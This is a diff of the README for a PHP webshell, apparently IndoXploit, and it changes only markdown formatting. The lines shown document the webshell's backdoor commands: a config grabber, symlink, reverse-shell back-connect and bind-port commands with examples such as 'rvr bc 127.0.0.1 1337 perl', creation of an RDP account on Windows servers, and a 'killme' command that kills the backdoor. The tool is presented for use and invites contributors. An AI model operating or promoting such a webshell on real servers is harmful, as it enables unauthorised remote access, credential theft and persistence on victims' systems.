@@ -46,9 +46,10 @@ usage: jumping
 - Config Grabber
 usage: idxconfig
 
- - Symlink 
+ - ***Symlink***
+ ~~~
  usage: symlink
-
+~~~
  - ***Reverse Shell***
 ***[Back Connect]***
 usage: rvr bc [IP] [PORT] [TYPE]
@@ -61,21 +62,22 @@ rvr bc 127.0.0.1 1337 perl
 ***Bind Port***
 usage: rvr bp [PORT] [TYPE]
 example:
-~~
+~~~
 rvr bp 1337 perl
-~~
+~~~
 
  - ***KRDP - Create RDP Account (for windows server only)***
- 
+ ~~~
  usage: krdp
-
+~~~
  - ***Logout From Shell***
- 
+ ~~~
  usage: logout
-
+~~~
  - ***Kill Backdoor***
-
+~~~
 usage: killme
+~~~
 
  ## Contribute
  Drop an email at **shu@indoxploit.or.id** and tell us what your suggestions about how to improve this webshell.
